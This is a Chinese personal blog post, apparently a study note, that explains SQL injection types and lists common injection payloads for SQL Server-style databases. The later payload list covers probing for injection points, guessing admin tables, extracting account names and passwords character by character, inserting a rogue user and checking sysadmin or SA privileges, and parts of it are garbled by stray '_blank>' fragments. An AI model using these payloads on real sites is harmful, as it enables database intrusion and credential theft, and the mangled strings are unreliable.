<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="LXL"><meta name="copyright" content="LXL"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>SQL注入语句 | Welcome to My World</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.21/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><link rel="alternate" href="/atom.xml" title="Welcome to My World" type="application/atom+xml"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"一日游呀","version":"1.2.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><meta name="description" content="1. 什么是sql注入通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 2. sql注入类型按照注入点类型来分类（1）数字型注入点许多网页链接有类似的结构 http:&#x2F;&#x2F;xxx.com&#x2F;users.php?id&#x3D;1  基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入语句">
<meta property="og:url" content="http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/index.html">
<meta property="og:site_name" content="Welcome to My World">
<meta property="og:description" content="1. 什么是sql注入通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 2. sql注入类型按照注入点类型来分类（1）数字型注入点许多网页链接有类似的结构 http:&#x2F;&#x2F;xxx.com&#x2F;users.php?id&#x3D;1  基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，">
<meta property="og:locale">
<meta property="article:published_time" content="2020-11-10T20:30:22.000Z">
<meta property="article:modified_time" content="2020-11-10T12:54:22.186Z">
<meta property="article:author" content="LXL">
<meta property="article:tag" content="-sql">
<meta name="twitter:card" content="summary"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="LXL"><img width="96" loading="lazy" src="/Yun.png" alt="LXL"></a><div class="site-author-name"><a href="/about/">LXL</a></div><a class="site-name" href="/about/site.html">Welcome to My World</a><sub class="site-subtitle">BETTER</sub><div class="site-desciption">��������</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">13</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 群" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="豆瓣" target="_blank" style="color:#007722"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-douban-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="Telegram Channel" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">1. 什么是sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">2. sql注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B%E6%9D%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.0.1.</span> <span class="toc-text">按照注入点类型来分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">（1）数字型注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E8%AF%AD%E5%8F%A5%E5%8E%9F%E5%9E%8B"><span class="toc-number">3.0.1.</span> <span class="toc-text">sql语句原型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">（2）字符型注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E4%B8%80%E7%B1%BB-SQL-%E8%AF%AD%E5%8F%A5%E5%8E%9F%E5%9E%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">这一类 SQL 语句原型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">（3）搜索型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89GET-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">（1）GET 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89POST-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">（2）POST 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Cookie-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.</span> <span class="toc-text">（3）Cookie 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89HTTP-%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">（4）HTTP 头部注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.7.</span> <span class="toc-text">（1）基于布尔的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.8.</span> <span class="toc-text">（2）基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.9.</span> <span class="toc-text">（3）基于报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.10.</span> <span class="toc-text">（4）联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.10.1.</span> <span class="toc-text">常用语句</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%9C%89%E6%97%A0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.10.1.1.</span> <span class="toc-text">1.判断有无注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%8C%9C%E8%A1%A8%E4%B8%80%E8%88%AC%E7%9A%84%E8%A1%A8%E7%9A%84%E5%90%8D%E7%A7%B0%E6%97%A0%E9%9D%9E%E6%98%AF"><span class="toc-number">3.10.1.2.</span> <span class="toc-text">2.猜表一般的表的名称无非是</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E7%8C%9C%E5%B8%90%E5%8F%B7%E6%95%B0%E7%9B%AE"><span class="toc-number">3.10.1.3.</span> <span class="toc-text">3.猜帐号数目</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span class="toc-number">3.10.1.4.</span> <span class="toc-text">4.猜解字段名称</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%8C%9C%E8%A7%A3%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">3.10.1.5.</span> <span class="toc-text">5.猜解各个字段的长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E7%8C%9C%E8%A7%A3%E5%AD%97%E7%AC%A6"><span class="toc-number">3.10.1.6.</span> <span class="toc-text">6.猜解字符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.11.</span> <span class="toc-text"></span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="LXL"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Welcome to My World"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">SQL注入语句</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2020-11-10 20:30:22" itemprop="dateCreated datePublished" datetime="2020-11-10T20:30:22Z">2020-11-10</time></div><div class="post-classify"><span class="post-tag"><a class="tag" href="/tags/sql/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">-sql</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="1-什么是sql注入"><a href="#1-什么是sql注入" class="headerlink" title="1. 什么是sql注入"></a>1. 什么是sql注入</h2><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2. sql注入类型"></a>2. sql注入类型</h2><h4 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h4><h2 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h2><p>许多网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> </p>
<p>基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。 </p>
<h4 id="sql语句原型"><a href="#sql语句原型" class="headerlink" title="sql语句原型"></a>sql语句原型</h4><p> <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>
<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> </p>
<p>其注入点 name 类型为字符类型，所以叫字符型注入点。</p>
<h4 id="这一类-SQL-语句原型"><a href="#这一类-SQL-语句原型" class="headerlink" title="这一类 SQL 语句原型"></a>这一类 SQL 语句原型</h4><p> <code>select * from 表名 where name=&#39;admin&#39;</code> </p>
<p>值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>
<p><em>若存在注入</em>，我们可以构造出类似与如下的sql注入语句进行爆破：</p>
<p><code>select * from 表名 where name=&#39;admin&#39; and 1=1 &#39;</code> 我们需要将这些烦人的引号给处理掉。</p>
<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时<code>没过滤搜索参数</code>，一般在链接地址中有 <code>&quot;keyword=关键字&quot;</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>
<p>此类注入点提交的 SQL 语句，其原形大致为：</p>
<p><code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code></p>
<p> <em>若存在注入</em>，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like &#39;%测试%&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
<blockquote>
<p>按照数据提交的方式来分类</p>
</blockquote>
<h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a target="_blank" rel="noopener" href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p>
<h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
<h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
<h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<blockquote>
<p>按照执行效果来分类</p>
</blockquote>
<h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>
<h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<ol>
<li>单引号</li>
<li>双引号</li>
<li>基于数字型注入</li>
</ol>
<h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>
<h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><h5 id="1-判断有无注入点"><a href="#1-判断有无注入点" class="headerlink" title="1.判断有无注入点"></a>1.判断有无注入点</h5><p>; and 1=1 and 1=2</p>
<h5 id="2-猜表一般的表的名称无非是"><a href="#2-猜表一般的表的名称无非是" class="headerlink" title="2.猜表一般的表的名称无非是"></a>2.猜表一般的表的名称无非是</h5><p>admin adminuser user pass password 等.. </p>
<p>and 0&lt;&gt;(select count(*) from <em>)<br>and 0&lt;&gt;(select count(</em>) from admin) —判断是否存在admin这张表</p>
<h5 id="3-猜帐号数目"><a href="#3-猜帐号数目" class="headerlink" title="3.猜帐号数目"></a>3.猜帐号数目</h5><p>如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个<br>and 0&lt;(select count(<em>) from admin)<br>and 1&lt;(select count(</em>) from admin)</p>
<h5 id="4-猜解字段名称"><a href="#4-猜解字段名称" class="headerlink" title="4.猜解字段名称"></a>4.猜解字段名称</h5><p> 在len( ) 括号里面加上我们想到的字段名称.<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)–<br>and 1=(select count(<em>) from admin where len(用户字段名称name)&gt;0)<br>and 1=(select count(</em>) from admin where len(_blank&gt;密码字段名称password)&gt;0)</p>
<h5 id="5-猜解各个字段的长度"><a href="#5-猜解各个字段的长度" class="headerlink" title="5.猜解各个字段的长度"></a>5.猜解各个字段的长度</h5><p>猜解长度就是把&gt;0变换 直到返回正确页面为止<br>and 1=(select count(<em>) from admin where len(</em>)&gt;0)<br>and 1=(select count(<em>) from admin where len(name)&gt;6) 错误<br>and 1=(select count(</em>) from admin where len(name)&gt;5) 正确 长度是6<br>and 1=(select count(*) from admin where len(name)=6) 正确</p>
<p>and 1=(select count(<em>) from admin where len(password)&gt;11) 正确<br>and 1=(select count(</em>) from admin where len(password)&gt;12) 错误 长度是12<br>and 1=(select count(*) from admin where len(password)=12) 正确</p>
<h5 id="6-猜解字符"><a href="#6-猜解字符" class="headerlink" title="6.猜解字符"></a>6.猜解字符</h5><p>and 1=(select count(<em>) from admin where left(name,1)=a) —猜解用户帐号的第一位<br>and 1=(select count(</em>) from admin where left(name,2)=ab)—猜解用户帐号的第二位<br>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了<br>and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) –<br>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p>
<p>group by users.id having 1=1–<br>group by users.id, users.username, users.password, users.privs having 1=1–<br>; insert into users values( 666, attacker, foobar, 0xffff )–</p>
<p>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p>
<p>WHERE TABLE_blank&gt;_NAME=logintable-<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p>
<p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p>
<p>&gt;_id)-<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p>
<p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p>
<p>&gt;_id,login_blank&gt;_name)-<br>UNION SELECT TOP 1 login_blank&gt;_name FROM logintable-<br>UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul–</p>
<p>看_blank&gt;服务器打的补丁=出错了打了SP4补丁<br>and 1=(select @@VERSION)–</p>
<p>看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。<br>and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))–</p>
<p>判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）<br>and sa=(SELECT System_blank&gt;_user)–<br>and user_blank&gt;_name()=dbo–<br>and 0&lt;&gt;(select user_blank&gt;_name()–</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3></div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"></div><div style="display:inline-block"></div><div style="display:inline-block"></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>LXL</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/" title="SQL注入语句">http://example.com/2020/11/11/SQL%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless stating additionally.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2020/11/15/SQL1-2/" rel="prev" title="SQL1-2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">SQL1-2</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/10/24/DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" rel="next" title="DVWA和SQL注入靶场搭建"><span class="post-nav-text">DVWA和SQL注入靶场搭建</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>点击按钮跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/YunYouJun/yunyoujun.github.io/issues?q=is:issue+SQL注入语句">GitHub Issues</a></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2020 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> LXL</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.2.0</span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>